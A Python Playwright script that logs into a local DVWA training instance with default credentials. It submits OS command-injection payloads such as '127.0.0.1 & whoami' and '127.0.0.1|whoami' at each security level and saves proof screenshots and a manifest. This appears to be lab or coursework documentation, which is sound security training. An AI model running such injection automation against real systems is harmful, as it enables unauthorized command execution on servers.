#!/usr/bin/env python3
import argparse
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

from playwright.sync_api import sync_playwright


TZ = timezone(timedelta(hours=8))
PROOFS = [
    ("low", "127.0.0.1 & whoami"),
    ("medium", "127.0.0.1 & whoami"),
    ("high", "127.0.0.1|whoami"),
    ("impossible", "127.0.0.1|whoami"),
]


def now_iso():
    return datetime.now(TZ).isoformat(timespec="seconds")


def main():
    parser = argparse.ArgumentParser(description="Capture DVWA Command Injection proof screenshots.")
    parser.add_argument("--url", default="http://127.0.0.1/dvwa/")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", default="password")
    parser.add_argument("--output-dir", required=True)
    args = parser.parse_args()

    base = args.url if args.url.endswith("/") else args.url + "/"
    out_dir = Path(args.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    items = []

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page(viewport={"width": 1366, "height": 900})
        page.goto(base + "login.php", wait_until="networkidle")
        page.fill('input[name="username"]', args.username)
        page.fill('input[name="password"]', args.password)
        page.click('input[name="Login"]')
        page.wait_for_load_state("networkidle")

        for difficulty, payload in PROOFS:
            page.goto(base + "security.php", wait_until="networkidle")
            page.select_option('select[name="security"]', difficulty)
            page.click('input[name="seclev_submit"]')
            page.wait_for_load_state("networkidle")
            page.goto(base + "vulnerabilities/exec/", wait_until="networkidle")
            page.fill('input[name="ip"]', payload)
            page.click('input[name="Submit"]')
            page.wait_for_load_state("networkidle")
            path = out_dir / f"{difficulty}-proof.png"
            page.screenshot(path=str(path), full_page=True)
            items.append(
                {
                    "difficulty": difficulty,
                    "payload": payload,
                    "path": str(path),
                    "url": page.url,
                    "timestamp": now_iso(),
                }
            )

        browser.close()

    manifest = {"generated_at": now_iso(), "items": items}
    (out_dir / "manifest.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps(manifest, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
